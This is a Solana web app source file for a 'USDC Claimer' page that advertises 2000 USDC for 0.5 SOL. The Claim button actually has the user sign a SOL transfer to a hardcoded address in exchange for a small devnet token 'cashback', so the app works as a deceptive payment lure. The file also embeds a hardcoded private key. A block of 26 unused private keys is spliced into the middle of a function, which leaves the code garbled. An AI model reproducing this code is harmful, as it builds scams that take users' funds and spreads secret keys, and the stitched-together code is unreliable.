/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "1ZpUy9nqpiDQ9Vx1jywTFDLDGv6yjmw6uASzQAFqDYpNp84QNyHcGLcwVwxyAJ46hi6xquaKfuTAaJkVrLUZTqS"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3XaymmTt9u5TdssEiQTwFKaKqXk9t2KjkifPy3NdvV9KVktcZPhsgTcCFxDcAVkcwrcGiQv4MhcynXSMircedumq",
  "key1": "3pTqiEzKe385HM7qpDKRLj55wTazUmXWL4AWb5nzoz9fetyiZhcmxhap7eu2orgp2Hvr6kmMg6c9Fzp6irZcsy2M",
  "key2": "2iEny4AMEuUKMRv4igpt3xTt2SijQqXhEABSVzwBCZymScyoYoKSNnPtikSzwffjCQMP1ZKiGKBdkibof3G2cBdq",
  "key3": "5uvm1Jq5GfBB4EMRqXeBpRSbrnsSpFngGrMBccsWacgU53HX7P1rtDGnKWj7gGJzhvQoNzup4SrzDbhfuLbJbk8u",
  "key4": "4uFKy5jxWkJimSED9hixFhHTwjFHH63auPQS58ph2ypGYfpTtXwxisyW4dn8hiLUYXWe2DGyXWG8spusMVbQAUtK",
  "key5": "MiaPfk8xksAW5wxNJg2ZbbzdmxgddS3gZtp6hG5g2icLuxzwAYVUzHbevs7zMBz3zzTnxsTbPAgoZD4DqJ8kbMB",
  "key6": "64JzGdxzredKRNXGmpYUhQ2V6fSB21kXFR7sPkcK5Zu9aG6Lyr3z4NFC77UbQutLzUj55VDcVGQVYGdKP4No3Wi8",
  "key7": "5HRRg7pjPQD99nNWv7c7ZHAmMDun7ipr2FtYDgwbZygnZDWQJjy4HzxshoKbqcedRqJXqYoNgcE2A6FTyEfLdpNN",
  "key8": "3gw6mdGpHUKCX7sbLcz6H8PFpny7Vycqv4EzU7UWxYW5DuNpLFbibGHWFhN6ReBBXUywskBSR5aLjpr79dA9FTtt",
  "key9": "3nqxGihBUQMRBJ8Xy67iM8dYi4MGECCTCKcpBKXWFwHSGG4sAyuPZc4btAYJMeBniuvnB9iqctzikZtsteMUnPRg",
  "key10": "2vWiMCqPijWsUFYUVu6CCDupgnvYMBzS35Swzty7G2YcyV57tYYNxdByTsDmnMPmX5Gqy39QWpLE8Za7MTrHPj8J",
  "key11": "59rkF75oYFoupbngYZX6Eekryc21X4NK8YtnfYMAe1Z316kEANbo9eVRFUmfGbWD6CKiJfTDTfCi4oh4JJz85DNR",
  "key12": "24PWKpoVMXwuoZj6zVNuGqwXYY7etuPAcEZ1aHrWjqcw2Pj3JhqpEs3e1KhjoWpr1xWVcGxdX91E2mey7hRV2eN4",
  "key13": "24pVABtYQHBBGWcbfYkL8Z3mXDkJsxBgfFqsLuUcgHUsJLJmtKgLAwN6pMuEBv7ZKkVw93GcraHuWTx9n4EWGbMU",
  "key14": "5igtbUNxJVAXjwB1Qvhpfh9kaNcmvT8Yb1zvjYJ6fJnTgVR7hPbRq5K4UgR6pYqED6H3VBj59Dhux9TPPptoN5Rq",
  "key15": "39nBBEYCDQaZVF5YedA5yUPY27t5i55z1us2YisgQVb6Tv1z65xxRyhFrkqNuEaWEnwFAbTMJPAvJyFsCe1uAeZn",
  "key16": "22EzZmWR3JqrHhytgjzqZCz1dgvNz57Zj5FpNrCBBUxABX1wCZLiLfmwNGeXaMc7P3DtJyh8oB5E4deLt69VPsQX",
  "key17": "4CQQjimhQRhb1fv4NRxV2tcCocCynj3aJq7WhwufAiiWVVupSoFCoqB7H5otYf1UotX4wQ2ycdQir2kLiLA9zQYu",
  "key18": "5fydYarkEMYb4hC46NvrRdcRzK6S5gnJ1aosP35bVXosjSn2VgqEeRwaKaR4MfXrmZKk26LSyzMtYYKEaYeEvDS1",
  "key19": "4miEUW5YncWgcjtMwxLewtBdsHzwKdoXu6MvR2DDFDNwMz4e8GY1xP8nWVkQeuKi7Y2448BaSVNeNfmXPqjjdag5",
  "key20": "3VF8NwSkqEyeLKXcA353L3pHLzcwzbkzF6zHMS3nuxbUfYi1ELfA6RMnAdMiXuR3W2xS3XVfTuKDhTLQm7tXyYsK",
  "key21": "2ZyxSRGLKRUVqT43ECcRmHgSSpgbaNi29PSjzmSK6xQSumUXzsPtWKzU77m6oTNTesyXpacgtVPCJxDdp4ocRePc",
  "key22": "2tbiFnaz88mibsnbpD4VyNhvpPoyK1FG1rT4AoDiwwVoYQBFWrJLgXNweYmyALccFZH2QHbw5YhmmpUof3EgBNMH",
  "key23": "4N2GdjtnFTxmauW7GEwnQFEa8UsPoGVdbNBkQTw1CTa2ydEPKB5MGxFMEv8BxG7JPQZ4KGT9iyUidyUEzmHdNXRD",
  "key24": "4LMZC4FdbJDp9eTjMA9zM2YkPin2UE4vC9MExQoP74G8H52KZfEoZ8uoTpFuRXwH3CJPDWPsMjNfnbyJjTukd4dc",
  "key25": "bZ58fomDbiYGShbYafWM7ja3VYkjYtuwC7RZpiG8i6CZHFGYvMwtBYpfq9n83g1z9Nj5B7kcxe3pX1MQwZraWrM"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
